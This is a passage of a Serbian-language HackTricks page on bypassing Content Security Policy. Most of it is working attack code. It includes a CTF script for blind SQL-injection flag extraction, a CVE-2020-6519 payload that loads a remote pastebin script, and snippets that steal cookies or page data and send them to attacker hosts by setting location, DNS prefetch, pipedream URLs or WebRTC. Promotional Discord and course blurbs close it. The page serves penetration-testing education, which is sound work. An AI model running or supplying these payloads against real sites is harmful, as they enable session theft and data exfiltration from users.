<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Preko Bookmarklet-a

Ovaj napad podrazumeva neku vrstu socijalnog inženjeringa gde napadač **ubeđuje korisnika da prevuče i ispusti link preko bookmarklet-a u pregledaču**. Ovaj bookmarklet bi sadržao **zlonamerni JavaScript** kod koji bi se izvršio u kontekstu trenutnog prozora veba kada se prevuče i klikne, **zaobilazeći CSP i omogućavajući krađu osetljivih informacija** kao što su kolačići ili tokeni.

Za više informacija [**proverite originalni izveštaj ovde**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Zaobilaženje CSP ograničenjem CSP-a

U [**ovom CTF izveštaju**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP je zaobiđen ubacivanjem restriktivnijeg CSP-a unutar dozvoljenog iframe-a koji onemogućava učitavanje određene JS datoteke koja, zatim, putem **zagađivanja prototipa** ili **zagađivanja DOM-a** omogućava **zloupotrebu drugog skripta za učitavanje proizvoljnog skripta**.

Možete **ograničiti CSP iframe-a** pomoću atributa **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

U [**ovom CTF izveštaju**](https://github.com/aszx87410/ctf-writeups/issues/48), bilo je moguće putem **HTML ubacivanja** ograničiti **CSP** tako da je skripta koja sprečava CSTI bila onemogućena i samim tim je **ranjivost postala iskoristiva**.\
CSP može biti postavljen restriktivnije korišćenjem **HTML meta tagova**, a inline skripte mogu biti onemogućene **uklanjanjem** unosa koji dozvoljava njihov **nonce** i **omogućavanje specifične inline skripte putem sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### JS eksfiltracija pomoću Content-Security-Policy-Report-Only

Ako uspete da naterate server da odgovori sa zaglavljem **`Content-Security-Policy-Report-Only`** sa **vrednošću koju kontrolišete** (možda zbog CRLF), možete ga naterati da upućuje na vaš server i ako **obuhvatite** JS sadržaj koji želite da eksfiltrirate sa **`<script>`** i zato što je vrlo verovatno da `unsafe-inline` nije dozvoljen prema CSP, ovo će **izazvati CSP grešku** i deo skripta (koji sadrži osetljive informacije) će biti poslat serveru iz `Content-Security-Policy-Report-Only`.

Za primer [**proverite ovaj CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Otkrivanje informacija pomoću CSP i Iframe

- Kreira se `iframe` koji pokazuje na URL (nazovimo ga `https://example.redirect.com`) koji je dozvoljen od strane CSP-a.
- Taj URL zatim preusmerava na tajni URL (npr. `https://usersecret.example2.com`) koji **nije dozvoljen** od strane CSP-a.
- Slušanjem događaja `securitypolicyviolation`, moguće je uhvatiti svojstvo `blockedURI`. Ovo svojstvo otkriva domen blokiranog URI-ja, otkrivajući tajni domen na koji je prvobitni URL preusmeren.

Zanimljivo je napomenuti da pregledači poput Chrome-a i Firefox-a imaju različito ponašanje prilikom rukovanja iframe-ovima u vezi sa CSP-om, što može dovesti do potencijalnog otkrivanja osetljivih informacija zbog nedefinisanog ponašanja.

Još jedna tehnika uključuje iskorišćavanje samog CSP-a kako bi se zaključio tajni poddomen. Ova metoda se oslanja na binarnu pretragu i prilagođavanje CSP-a kako bi se uključili određeni domeni koji su namerno blokirani. Na primer, ako je tajni poddomen sastavljen od nepoznatih karaktera, možete iterativno testirati različite poddomene tako što ćete menjati CSP direktivu da blokira ili dozvoli ove poddomene. Evo isečka koji prikazuje kako bi CSP mogao biti podešen da olakša ovu metodu:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Prateći koje zahteve CSP blokira ili dozvoljava, moguće je suziti moguće karaktere u tajnom poddomenu i na kraju otkriti punu URL adresu.

Oba metoda iskorišćavaju nijanse implementacije i ponašanja CSP-a u pregledačima, pokazujući kako se naizgled sigurne politike mogu nenamerno otkriti osetljive informacije.

Triks sa [**ovde**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Pridružite se serveru [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hakerski uvidi**\
Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja

**Hakerske vesti u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja putem vesti i uvida u realnom vremenu

**Najnovije objave**\
Budite informisani o najnovijim nagradama za pronalaženje bagova i važnim ažuriranjima platforme

**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!

## Nesigurne tehnologije za zaobilaženje CSP-a

### Preopterećenje PHP odgovora baferom

PHP je poznat po tome što podrazumevano **baferuje odgovor do 4096** bajtova. Stoga, ako PHP prikazuje upozorenje, pružanjem **dovoljno podataka unutar upozorenja**, **odgovor će biti poslat pre** **CSP zaglavlja**, što dovodi do ignorisanja zaglavlja.\
Zatim, tehnika se sastoji u suštini u **popunjavanju bafera odgovora upozorenjima** kako bi CSP zaglavlje nije poslato.

Ideja preuzeta sa [**ovog writeup-a**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Prepravljanje stranice sa greškom

Iz [**ovog writeup-a**](https://blog.ssrf.kr/69) izgleda da je bilo moguće zaobići CSP zaštitu učitavanjem stranice sa greškom (potencijalno bez CSP-a) i prepravljanjem njenog sadržaja.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME je tehnika koja zloupotrebljava XSS (ili veoma ograničeni XSS) **na kraju stranice** kako bi **zloupotrebila** **druge krajnje tačke istog porekla.** Ovo se postiže učitavanjem ranjive krajnje tačke sa stranice napadača, a zatim osvežavanjem stranice napadača do stvarne krajnje tačke u istom poreklu koju želite zloupotrebiti. Na ovaj način, **ranjiva krajnja tačka** može koristiti objekat **`opener`** u **payload-u** da bi **pristupila DOM-u** stvarne krajnje tačke koju želite zloupotrebiti. Za više informacija pogledajte:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Osim toga, **wordpress** ima JSONP krajnju tačku u `/wp-json/wp/v2/users/1?_jsonp=data` koja će **reflektovati** **podatke** poslate u izlazu (sa ograničenjem samo slova, brojeva i tačaka).

Napadač može zloupotrebiti tu krajnju tačku da bi **izveo SOME napad** na WordPress i **ugradio** ga unutar `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` obratite pažnju da će se ovaj **skript** **učitati** jer je **dozvoljen od strane 'self'**. Osim toga, zbog instaliranog WordPress-a, napadač može zloupotrebiti **SOME napad** putem **ranjive** **callback** krajnje tačke koja **zaobilazi CSP** kako bi korisniku dala više privilegija, instalirala novi dodatak...
Za više informacija o tome kako izvesti ovaj napad pogledajte [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Bypass-ovi CSP eksfiltracije

Ako postoji strogi CSP koji vam ne dozvoljava da **interagujete sa spoljnim serverima**, postoje neke stvari koje uvek možete uraditi da biste eksfiltrirali informacije.

### Location

Jednostavno možete ažurirati lokaciju kako biste poslali tajne informacije na server napadača:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta oznaka

Možete preusmeriti ubrizgavanjem meta oznake (ovo je samo preusmeravanje, neće procuriti sadržaj)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Da biste ubrzali učitavanje stranica, pregledači unapred rešavaju imena hostova u IP adrese i keširaju ih za kasniju upotrebu. 
Možete navesti pregledač da unapred rešava ime hosta koristeći: `<link reol="dns-prefetch" href="something.com">`

Možete zloupotrebiti ovu funkcionalnost da **izfiltrirate osetljive informacije putem DNS zahteva**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Još jedan način:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Da biste to izbegli, server može poslati HTTP zaglavlje:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Očigledno, ova tehnika ne funkcioniše u headless browserima (botovima).
{% endhint %}

### WebRTC

Na nekoliko stranica možete pročitati da **WebRTC ne proverava `connect-src` politiku** CSP-a.

Zapravo, možete _procuriti_ informacije koristeći _DNS zahtev_. Pogledajte ovaj kod:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Druga opcija:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Provera CSP politika online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Automatsko kreiranje CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Reference

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hacking Insights**\
Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja

**Real-Time Hack News**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Latest Announcements**\
Budite informisani o najnovijim nagradama za pronalaženje bagova i važnim ažuriranjima platforme

**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
